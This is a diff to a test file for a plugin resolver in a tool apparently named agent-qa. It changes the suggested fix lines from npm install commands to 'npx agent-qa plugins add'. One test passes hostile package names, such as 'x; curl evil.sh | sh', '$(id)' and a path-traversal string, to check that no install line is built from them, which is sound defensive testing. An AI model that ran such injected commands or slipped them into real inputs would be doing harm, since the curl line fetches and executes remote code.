@@ -53,15 +53,15 @@ describe('first-party plugin versions', () => {
     })
   })
 
-  it('refuses a first-party plugin at another version with the exact install line', () => {
+  it('refuses a first-party plugin at another version and names plugins add', () => {
     installPluginPackage(fixture.configDir, SCRIPTED, '1.3.9', remoteManifest())
 
     expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
       state: 'version_mismatch',
-      install: `npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}`,
+      install: `npx agent-qa plugins add ${SCRIPTED}`,
       reason:
         `Plugin entry scripted names ${SCRIPTED} at 1.3.9, and agent-qa is at ${VERSION}. `
-        + `Run npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}.`,
+        + `Run npx agent-qa plugins add ${SCRIPTED}.`,
     })
   })
 
@@ -74,27 +74,27 @@ describe('first-party plugin versions', () => {
   })
 })
 
-describe('install lines', () => {
-  it('pins a first-party plugin to the agent-qa version', () => {
-    expect(pluginInstallLine({ name: 'scripted', package: SCRIPTED }, VERSION)).toBe(
-      `npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}`,
+describe('plugin fix lines', () => {
+  it('names plugins add for a first-party plugin', () => {
+    expect(pluginInstallLine({ name: 'scripted', package: SCRIPTED })).toBe(
+      `npx agent-qa plugins add ${SCRIPTED}`,
     )
   })
 
-  it('names a third-party package as declared, with no version', () => {
-    expect(pluginInstallLine({ name: 'acme', package: ACME }, VERSION)).toBe(
-      `npm install --save-dev ${ACME}`,
+  it('names plugins add for a third-party package as declared, with no version', () => {
+    expect(pluginInstallLine({ name: 'acme', package: ACME })).toBe(
+      `npx agent-qa plugins add ${ACME}`,
     )
   })
 
   it('has no install line for a path', () => {
-    expect(pluginInstallLine({ name: 'local', path: './tools/acme' }, VERSION)).toBeUndefined()
+    expect(pluginInstallLine({ name: 'local', path: './tools/acme' })).toBeUndefined()
   })
 
   it.each(['x; curl evil.sh | sh', '@vostride/agent-qa-plugin-x/../../evil', '$(id)', '..'])(
     'builds no install line from %j, which is not an npm package name',
     (hostile) => {
-      expect(pluginInstallLine({ name: 'acme', package: hostile }, VERSION)).toBeUndefined()
+      expect(pluginInstallLine({ name: 'acme', package: hostile })).toBeUndefined()
 
       const resolved = resolvePluginEntry({ name: 'acme', package: hostile }, options)
 
@@ -105,16 +105,16 @@ describe('install lines', () => {
           + 'plugins, or name a folder with path.',
       })
       expect(resolved.install).toBeUndefined()
-      expect(resolved.reason).not.toContain('npm install')
+      expect(resolved.reason).not.toContain('plugins add')
     },
   )
 
-  it('gives a missing first-party plugin its pinned install line', () => {
+  it('tells a missing first-party plugin to run plugins add', () => {
     expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
       state: 'not_installed',
       reason:
         `Plugin entry scripted names ${SCRIPTED}, which is not installed. `
-        + `Run npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}.`,
+        + `Run npx agent-qa plugins add ${SCRIPTED}.`,
     })
   })
 })
@@ -233,14 +233,14 @@ describe('selecting in-process entries', () => {
     state: 'not_installed',
     reason:
       `Plugin entry subscription names ${SUBSCRIPTION}, which is not installed. `
-      + `Run npm install --save-dev ${SUBSCRIPTION}.`,
+      + `Run npx agent-qa plugins add ${SUBSCRIPTION}.`,
   }
   const missingGone = {
     entry: 'gone',
     state: 'not_installed',
     reason:
       'Plugin entry gone names @acme/never-installed, which is not installed. '
-      + 'Run npm install --save-dev @acme/never-installed.',
+      + 'Run npx agent-qa plugins add @acme/never-installed.',
   }
 
   function installMixedList() {
